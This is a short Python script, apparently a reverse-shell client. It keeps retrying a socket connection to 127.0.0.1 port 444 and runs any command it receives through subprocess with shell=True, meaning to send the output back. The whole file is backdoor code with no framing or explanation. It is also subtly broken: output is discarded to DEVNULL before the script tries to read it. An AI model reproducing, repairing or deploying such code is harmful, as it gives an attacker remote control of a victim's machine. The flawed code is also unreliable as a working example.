import socket
import subprocess
class Client():
    def __init__(self):
        print("")
    def connect(self):
        while 1:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("127.0.0.1", 444))
                break
            except socket.error:
                pass
        while 1:
            try:
                recv = s.recv(102400).decode("utf-8")
                process = subprocess.Popen(recv, shell=True, stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
                output = process.stdout.read()
                s.send(output)
            except socket.error:
                Client.connect(self)
client = Client()
client.connect()